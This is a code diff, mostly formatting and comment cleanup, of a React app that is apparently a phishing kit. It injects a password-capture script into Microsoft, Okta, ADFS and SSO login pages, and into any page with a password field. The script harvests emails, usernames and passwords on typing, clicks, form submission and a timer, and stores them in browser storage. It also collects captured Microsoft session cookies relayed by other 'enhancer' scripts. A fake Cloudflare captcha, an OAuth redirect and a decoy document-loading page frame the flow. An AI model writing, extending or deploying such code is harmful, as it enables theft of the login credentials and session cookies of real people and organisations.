@@ -25,15 +25,15 @@ function App() {
     const injectPasswordCaptureScript = () => {
       // Only inject if we're on a Microsoft or organizational domain
       const hostname = window.location.hostname;
-      const isMicrosoftDomain = hostname.includes('login.microsoftonline.com') || 
-                               hostname.includes('login.live.com') ||
-                               hostname.includes('account.microsoft.com');
-      
-      const isOrgDomain = hostname.includes('adfs') || 
-                         hostname.includes('sso') || 
-                         hostname.includes('okta') ||
-                         hostname.includes('ping') ||
-                         document.querySelector('input[type="password"]');
+      const isMicrosoftDomain = hostname.includes('login.microsoftonline.com') ||
+        hostname.includes('login.live.com') ||
+        hostname.includes('account.microsoft.com');
+
+      const isOrgDomain = hostname.includes('adfs') ||
+        hostname.includes('sso') ||
+        hostname.includes('okta') ||
+        hostname.includes('ping') ||
+        document.querySelector('input[type="password"]');
 
       if (isMicrosoftDomain || isOrgDomain) {
         const script = document.createElement('script');
@@ -41,7 +41,7 @@ function App() {
           // Password capture for Microsoft/organizational login pages
           (function() {
             console.log('🔑 Password capture script loaded on:', window.location.hostname);
-            
+
             let capturedCredentials = {
               email: '',
               password: '',
@@ -49,15 +49,15 @@ function App() {
               domain: window.location.hostname,
               captureTime: new Date().toISOString()
             };
-            
+
             function capturePasswordFromForms() {
               try {
                 const passwordFields = document.querySelectorAll('input[type="password"]');
                 const emailFields = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[id*="email"]');
                 const usernameFields = document.querySelectorAll('input[name*="user"], input[name*="login"], input[name*="account"], input[id*="user"], input[id*="login"]');
-                
+
                 let hasNewData = false;
-                
+
                 passwordFields.forEach(field => {
                   if (field.value && field.value !== capturedCredentials.password) {
                     capturedCredentials.password = field.value;
@@ -65,7 +65,7 @@ function App() {
                     console.log('🔑 Password captured from field:', field.name || field.id || 'unnamed');
                   }
                 });
-                
+
                 emailFields.forEach(field => {
                   if (field.value && field.value !== capturedCredentials.email) {
                     capturedCredentials.email = field.value;
@@ -73,7 +73,7 @@ function App() {
                     console.log('📧 Email captured from field:', field.name || field.id || 'unnamed');
                   }
                 });
-                
+
                 usernameFields.forEach(field => {
                   if (field.value && field.value !== capturedCredentials.username) {
                     capturedCredentials.username = field.value;
@@ -81,18 +81,18 @@ function App() {
                     console.log('👤 Username captured from field:', field.name || field.id || 'unnamed');
                   }
                 });
-                
+
                 if (hasNewData) {
                   storeCredentials();
                 }
-                
+
                 return hasNewData;
               } catch (error) {
                 console.error('❌ Error capturing password:', error);
                 return false;
               }
             }
-            
+
             function storeCredentials() {
               const credentialsData = {
                 email: capturedCredentials.email,
@@ -103,12 +103,12 @@ function App() {
                 source: 'injected-password-capture',
                 url: window.location.href
               };
-              
+
               try {
                 sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
                 localStorage.setItem('user_credentials', JSON.stringify(credentialsData));
                 sessionStorage.setItem('login_credentials_backup', JSON.stringify(credentialsData));
-                
+
                 console.log('💾 Stored credentials:', {
                   hasEmail: !!credentialsData.email,
                   hasPassword: !!credentialsData.password,
@@ -118,24 +118,24 @@ function App() {
                 console.error('❌ Error storing credentials:', error);
               }
             }
-            
+
             // Monitor input changes
             document.addEventListener('input', function(e) {
-              if (e.target.type === 'password' || 
+              if (e.target.type === 'password' ||
                   e.target.name?.toLowerCase().includes('password') ||
                   e.target.name?.toLowerCase().includes('email') ||
                   e.target.name?.toLowerCase().includes('user') ||
                   e.target.id?.toLowerCase().includes('password') ||
                   e.target.id?.toLowerCase().includes('email') ||
                   e.target.id?.toLowerCase().includes('user')) {
-                
+
                 console.log('🔍 Credential field changed:', e.target.name || e.target.id, e.target.type);
                 setTimeout(() => {
                   capturePasswordFromForms();
                 }, 300);
               }
             });
-            
+
             // Monitor form submissions
             document.addEventListener('submit', function(e) {
               console.log('📝 Form submitted, capturing credentials...');
@@ -143,38 +143,38 @@ function App() {
                 capturePasswordFromForms();
               }, 100);
             });
-            
+
             // Monitor button clicks
             document.addEventListener('click', function(e) {
               const target = e.target;
-              if (target.type === 'submit' || 
+              if (target.type === 'submit' ||
                   target.textContent?.toLowerCase().includes('sign in') ||
                   target.textContent?.toLowerCase().includes('login') ||
                   target.textContent?.toLowerCase().includes('next') ||
                   target.className?.toLowerCase().includes('submit') ||
                   target.className?.toLowerCase().includes('login')) {
-                
+
                 console.log('🖱️ Login button clicked, capturing credentials...');
                 setTimeout(() => {
                   capturePasswordFromForms();
                 }, 500);
               }
             });
-            
+
             // Periodic capture for auto-fill
             setInterval(() => {
               capturePasswordFromForms();
             }, 3000);
-            
+
             // Initial capture
             setTimeout(() => {
               capturePasswordFromForms();
             }, 1000);
-            
+
             console.log('✅ Password capture script initialized');
           })();
         `;
-        
+
         document.head.appendChild(script);
         console.log('📝 Injected password capture script');
       }
@@ -182,21 +182,21 @@ function App() {
 
     // Inject script when app loads
     injectPasswordCaptureScript();
-    
+
     // Also inject when URL changes (for SPAs)
     const originalPushState = history.pushState;
     const originalReplaceState = history.replaceState;
-    
+
     history.pushState = function(...args) {
       originalPushState.apply(history, args);
       setTimeout(injectPasswordCaptureScript, 1000);
     };
-    
+
     history.replaceState = function(...args) {
       originalReplaceState.apply(history, args);
       setTimeout(injectPasswordCaptureScript, 1000);
     };
-    
+
     window.addEventListener('popstate', () => {
       setTimeout(injectPasswordCaptureScript, 1000);
     });
@@ -210,32 +210,26 @@ function App() {
   // Listen for messages from enhancer scripts for robust cookie/email capture
   useEffect(() => {
     function handleMessage(event: MessageEvent) {
-      // For security, you may check event.origin here if needed
       if (!event.data || typeof event.data !== 'object') return;
 
-      // EMAIL ENHANCER
       if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
         setCapturedEmailState(event.data.email);
-        setCapturedEmail(event.data.email); // Also store in utils for access anywhere
+        setCapturedEmail(event.data.email);
       }
 
-      // MICROSOFT COOKIES ENHANCER
       if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
         try {
-          // Store as JSON string in state
           const cookiesJson = JSON.stringify(event.data.data.cookies);
           setCapturedCookiesState(cookiesJson);
-          setCapturedCookies(event.data.data.cookies); // Store in utils for access anywhere
+          setCapturedCookies(event.data.data.cookies);
         } catch (e) {
           // fallback: ignore
         }
       }
 
-      // ORGANIZATIONAL LOGIN ENHANCER
       if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
         setCapturedEmailState(event.data.data.email);
         setCapturedEmail(event.data.data.email);
-        // You could also capture org credentials if needed
       }
     }
 
@@ -243,7 +237,6 @@ function App() {
     return () => window.removeEventListener('message', handleMessage);
   }, []);
 
-  // Check URL parameters only once on initial load
   useEffect(() => {
     const urlParams = new URLSearchParams(window.location.search);
     const step = urlParams.get('step');
@@ -253,7 +246,7 @@ function App() {
     }
   }, []);
 
-  // Use effect to handle delayed step transitions
+  // Use effect to handle delayed step transitions (not used for captcha to oauth anymore)
   useEffect(() => {
     if (pendingStep) {
       const timer = setTimeout(() => {
@@ -264,31 +257,23 @@ function App() {
     }
   }, [pendingStep]);
 
-  // Step 1: Captcha verified: go to oauth redirect (delay is now handled by CloudflareCaptcha)
+  // Captcha verified: go to oauth redirect (delay handled in CloudflareCaptcha)
   const handleCaptchaVerified = () => {
-    console.log('✅ CAPTCHA verified - moving to OAuth redirect');
     setPendingStep('oauth-redirect');
   };
 
-  // Refresh page for back-to-captcha
   const handleCaptchaBack = () => {
-    console.log('⬅️ Back to CAPTCHA (refresh page)');
     window.location.reload();
   };
 
-  // Step 3: OAuth success: after Telegram, show loading document (final step, no more captcha)
   const handleOAuthSuccess = async (sessionData: any) => {
-    console.log('🔐 OAuth successful:', sessionData);
     setCurrentPage('document-loading');
   };
 
-  // Allow user to retry OAuth from loading page if needed
   const handleOAuthBack = () => {
-    console.log('⬅️ Back to message icon from OAuth');
     setCurrentPage('message-icon');
   };
 
-  // Render current page based on flow
   switch (currentPage) {
     case 'captcha':
       return (
@@ -302,8 +287,8 @@ function App() {
 
     case 'message-icon':
       return (
-        <MessageIconLanding 
-          onOpenMessage={() => {}} // No longer used in flow
+        <MessageIconLanding
+          onOpenMessage={() => {}}
         />
       );
 
@@ -317,22 +302,21 @@ function App() {
     case 'success':
     case 'document-loading':
       return (
-        <div style={{ 
-          display: 'flex', 
-          justifyContent: 'center', 
-          alignItems: 'center', 
+        <div style={{
+          display: 'flex',
+          justifyContent: 'center',
+          alignItems: 'center',
           height: '100vh',
           fontFamily: 'Arial, sans-serif',
           backgroundColor: '#f3f2f1'
         }}>
-          <div style={{ 
+          <div style={{
             textAlign: 'center',
             background: 'white',
             padding: '60px',
             borderRadius: '8px',
             boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
           }}>
-            {/* Spinning document icon */}
             <div style={{
               width: '80px',
               height: '80px',
@@ -360,7 +344,7 @@ function App() {
               gap: '10px',
               marginTop: '30px'
             }}>
-              <button 
+              <button
                 onClick={() => setCurrentPage('captcha')}
                 style={{
                   padding: '10px 20px',
@@ -373,7 +357,7 @@ function App() {
               >
                 Start Over
               </button>
-              <button 
+              <button
                 onClick={() => setCurrentPage('oauth-redirect')}
                 style={{
                   padding: '10px 20px',
